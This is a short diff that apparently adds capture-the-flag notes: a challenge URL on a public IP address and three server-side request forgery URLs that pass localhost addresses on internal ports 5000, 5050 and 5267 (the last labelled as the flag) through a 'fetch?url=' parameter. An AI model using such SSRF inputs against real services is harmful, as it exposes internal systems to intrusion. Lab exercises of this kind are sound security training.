@@ -1,0 +1,4 @@
+Challenge Link: http://136.115.87.65:31770/
+Port 5000: http://136.115.87.65:31770/fetch?url=http://127.0.0.1:5000/
+Port 5050: http://136.115.87.65:31770/fetch?url=http://127.0.0.1:5050/
+Port 5267(The Flag): http://136.115.87.65:31770/fetch?url=http://127.0.0.1:5267/
